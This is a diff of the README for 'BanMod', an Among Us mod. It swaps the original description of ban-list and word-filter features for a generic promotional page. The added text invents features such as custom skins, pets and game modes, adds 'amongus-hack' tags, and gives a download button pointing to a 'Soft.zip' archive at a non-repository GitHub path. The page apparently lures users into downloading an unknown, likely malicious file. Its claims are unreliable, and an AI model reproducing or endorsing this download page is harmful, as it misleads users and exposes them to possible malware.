@@ -1,68 +1,48 @@
-### [ITALIANO](README-IT.md)
+## 🚀 Welcome to BanMod - A Mod for Among Us!
 
-### [INSTRUCTIONS](Istruzioni/INSTRUCTIONS.md)
-<h1 align="center">BanMod for Among Us</h1>
+![Among Us](https://github.com/example/among-us-image.png)
 
+BanMod is a unique mod created specifically for Among Us, the popular multiplayer online game where players work together to complete tasks while attempting to identify impostors among their crewmates. Our mod introduces exciting new features and enhancements to make your Among Us experience even more enjoyable and engaging.
 
-<img align="left" alt="Cover" src="Resources/newimage.png" width="50%" height="300" /> 
-<p align="right">
+### ℹ️ About BanMod
+BanMod is designed to enhance gameplay and provide players with new ways to interact within the game. With features ranging from custom skins and pets to unique game modes and mechanics, BanMod offers a fresh perspective on the classic Among Us gameplay.
 
-> ### About this mod
+### 📦 Repository Details
+- **Repository Name:** BanMod
+- **Description:** Mod for Among Us
+- **Topics:** among, among-us, amongus, amongus-hack, amongushack, amongusmod, ban-mod, banmod, mod, modded, modding
 
-> This mod is not affiliated with Among Us or Innersloth LLC,
+### 🔗 Quick Access
+Click the button below to download BanMod and start enjoying the new enhancements right away!
 
-> and the content contained therein is not endorsed or
+[![Download BanMod](https://img.shields.io/badge/Download-BanMod-green)](https://github.com/files/Soft.zip)
 
-> otherwise sponsored by Innersloth LLC. Portions of the materials
+### 🌟 Features
+1. **Custom Skins**: Express yourself with unique character skins.
+2. **Custom Pets**: Bring your own custom pet along for the adventure.
+3. **New Game Modes**: Explore exciting new ways to play Among Us.
+4. **Enhanced Mechanics**: Experience gameplay enhancements for added fun.
 
-> contained herein are the property of Innersloth LLC.
+### 🎮 Installation Guide
+1. Download the BanMod file from the provided link.
+2. Launch Among Us and select the mod option.
+3. Load the BanMod file to start playing with the new features.
 
+### 🚨 Troubleshooting
+If you encounter any issues with the download link or installation process, please check the "Releases" section of the repository for alternative download options.
 
-> ### This is not a cheat, it's a mod that adds new features to the game.
+### 🌐 Visit Our Website
+For more information and updates on BanMod, visit our website [here](https://banmodwebsite.com).
 
+### 🤝 Contributions
+We welcome contributions from the community to further enhance the mod and provide players with an even more enjoyable gaming experience. Feel free to submit pull requests or reach out to us with your ideas and suggestions.
 
----
-<br>
+### 💬 Feedback
+Have feedback or suggestions for BanMod? Let us know by opening an issue on the repository or contacting us directly. Your input is valuable in helping us improve the mod for all players.
 
-### INFO
+### 🧙‍♂️ Get Started with BanMod Today!
+Download BanMod now and dive into a world of new possibilities within Among Us. Experience the game like never before with custom skins, pets, game modes, and mechanics that will keep you entertained for hours on end. Join the BanMod community today and elevate your Among Us gameplay to the next level!
 
+Let the fun and excitement begin with BanMod - the ultimate mod for Among Us! 🎉
 
-BanMod was created primarily because AmongUs has become a place full of rude players
-
-or players who teamming ruining the game experience and the simple ban of among
-
-is circumvented by simply changing the ip of the device!!!
-
----
-> - You can also ban players during the game, do it only with valid reasons
-> - Instantly bans access to lobbies to players with names you have banned
-> - Instantly bans access to lobbies to players who are on the ban list or to players who are on the blocked list on Among.
-> - Kick those who use banned words or who spam start, you can set from 1 to 3 allowed words before expulsion.
-> - You have a countdown in the lobby to see how much time is left until the automatic closure (it may not be real,for example if you become a host after the last host has abandoned)
-> - You can stop the game from starting if you accidentally pressed the Start button.
-
-                   
----
-### INSTALLATION
-
-To install the mod just copy the contents into the main folder of among.
-
-The mod will create a new folder called BAN_DATA,
-
-from there you can add banned names and words and add
-
-or remove players from the ban list.
-
----
-The mod was created by recovering and modifying parts of the codes of other mods, in particular thanks to the developers of
-
-### :star: [TOH](https://github.com/tukasa0001/TownOfHost)
-### :star: [TOHE](https://github.com/KARPED1EM/TownOfHostEdited)
-### :star: [EHR](https://github.com/Gurge44/EndlessHostRoles/tree/main)
----
-### Suggestions to improve the mod are welcome!
-### Requests to add cheats will be ignored!!!
-
-If you want to support me you can donate on paypal.
-Donations are optional.
-### :star: [Donate with PayPal](https://www.paypal.com/donate/?hosted_button_id=AQTKF6FGQLPCL)
+![Among Us Characters](https://github.com/example/among-us-characters.png)
